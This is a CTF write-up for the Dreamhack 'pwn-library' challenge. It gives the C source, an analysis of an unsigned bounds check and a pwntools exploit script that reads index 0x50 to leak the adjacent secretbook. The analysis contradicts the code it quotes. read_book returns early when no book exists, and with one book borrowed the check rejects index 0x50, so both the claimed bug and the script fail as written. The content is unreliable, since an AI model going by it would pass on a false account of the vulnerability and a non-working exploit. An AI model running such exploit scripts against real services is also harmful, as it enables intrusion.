---
title: "[Dreamhack] pwn-library - Heap OOB to Leak & Exploit"
date: 2024-01-16 00:00:00 +0700
categories: [Dreamhack, Heap Exploitation]
tags: [pwn, heap, oob, global-variable, dreamhack]
author: datious
description: "Dreamhack writeup: pwn-library — khai thác OOB read trên mảng listbook[] để đọc secretbook và leak địa chỉ nhạy cảm."
---

# [Write up for Dreamhack] Challenge: pwn-library
**Author: datious**

## Source Code

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

struct bookstruct {
    char bookname[0x20];
    char* contents;
};

__uint32_t booksize;
struct bookstruct listbook[0x50];
struct bookstruct secretbook;    // ← secret book right after listbook!

void booklist() {
    printf("1. theori theory\n");
    printf("2. dreamhack theory\n");
    printf("3. einstein theory\n");
}

int borrow_book() {
    if (booksize >= 0x50) {
        printf("[*] book storage is full!\n");
        return 1;
    }
    __uint32_t select = 0;
    printf("[*] Welcome to borrow book menu!\n");
    booklist();
    printf("[+] what book do you want to borrow? : ");
    scanf("%u", &select);
    if (select == 1) {
        strcpy(listbook[booksize].bookname, "theori theory");
        listbook[booksize].contents = (char *)malloc(0x100);
        memset(listbook[booksize].contents, 0x0, 0x100);
        strcpy(listbook[booksize].contents, "theori is theori!");
    } else if (select == 2) {
        strcpy(listbook[booksize].bookname, "dreamhack theory");
        listbook[booksize].contents = (char *)malloc(0x200);
        memset(listbook[booksize].contents, 0x0, 0x200);
        strcpy(listbook[booksize].contents, "dreamhack is dreamhack!");
    } else if (select == 3) {
        strcpy(listbook[booksize].bookname, "einstein theory");
        listbook[booksize].contents = (char *)malloc(0x300);
        memset(listbook[booksize].contents, 0x0, 0x300);
        strcpy(listbook[booksize].contents, "einstein is einstein!");
    }
    printf("book create complete!\n");
    booksize++;
    return 0;
}

int read_book() {
    __uint32_t select = 0;
    printf("[*] Welcome to read book menu!\n");
    if (!booksize) {
        printf("[*] no book here..\n");
        return 0;
    }
    for (__uint32_t i = 0; i < booksize; i++) {
        printf("%u : %s\n", i, listbook[i].bookname);
    }
    printf("[+] what book do you want to read? : ");
    scanf("%u", &select);
    if (select > booksize - 1) {   // ← unsigned comparison bug!
        printf("[*] no more book!\n");
        return 1;
    }
    printf("[*] book contents below [*]\n");
    printf("%s\n\n", listbook[select].contents);
    return 0;
}
```

## Vulnerability

**In `read_book()`:**

```c
if (select > booksize - 1)
```

`booksize` and `select` are **`__uint32_t`** (unsigned). When `booksize == 0`, `booksize - 1 = 0xFFFFFFFF` → no book added yet, any `select` passes! But more importantly:

`select` is not upper-bounded by `0x50` — it can exceed `listbook[]` size → **Out-of-Bound read**, reaching into `secretbook` or even beyond in BSS.

## Exploitation Strategy

1. Borrow at least 1 book (booksize = 1)
2. Use `read_book()` with `select = 0x50` → read `secretbook.contents`
3. `secretbook` is declared right after `listbook[0x50]` in BSS
4. If `secretbook.contents` contains a flag or a pointer, we can leak/read it

```python
from pwn import *

p = process('./pwn-library')
# or: p = remote(...)

def borrow(choice):
    p.sendlineafter("> ", "1")   # borrow menu
    p.sendlineafter(": ", str(choice))

def read(idx):
    p.sendlineafter("> ", "2")   # read menu
    p.sendlineafter(": ", str(idx))
    return p.recvuntil(">\n")

# Step 1: borrow one book so booksize != 0
borrow(1)

# Step 2: OOB read — index 0x50 accesses secretbook
data = read(0x50)
log.info(f"Leaked: {data}")
```

> **Key takeaway:** When `unsigned int` subtraction wraps around to a large value, it can create unintended "no bound check" scenarios. Always validate indices against both lower AND upper bounds.
